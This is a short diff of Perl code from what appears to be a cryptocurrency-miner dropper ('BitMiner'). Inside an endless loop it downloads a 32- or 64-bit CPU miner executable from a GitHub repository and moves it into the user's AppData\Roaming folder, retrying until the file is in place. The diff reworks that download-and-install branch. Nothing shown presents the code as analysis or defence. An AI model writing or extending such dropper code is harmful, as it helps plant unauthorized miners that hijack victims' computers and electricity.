@@ -106,13 +106,10 @@ while(1){
   while(! -e \"\$disk:\\\\Users\\\\\$ENV{USERNAME}\\\\AppData\\\\Roaming\\\\NsCpuCNMiner.exe\"){
     if(\$Config{archname} =~ m/x86_64/ || \$Config{archname} =~ m/x64/){
       getstore(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner64.exe\", \"NsCpuCNMiner.exe\");
-    }else{
-      getstore(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner32.exe\", \"NsCpuCNMiner.exe\");
-    }
-    if(-e \"NsCpuCNMiner.exe\"){
       system(\"move NsCpuCNMiner.exe %AppData%\");
     }else{
-      next;
+      getstore(\"https://github.com/HatsuZ/BitMiner-v3/raw/master/NsCpuCNMiner32.exe\", \"NsCpuCNMiner.exe\");
+      system(\"move NsCpuCNMiner.exe %AppData%\");
     }
   }
   my \$response = \$ua->get(\"$_[0]\");
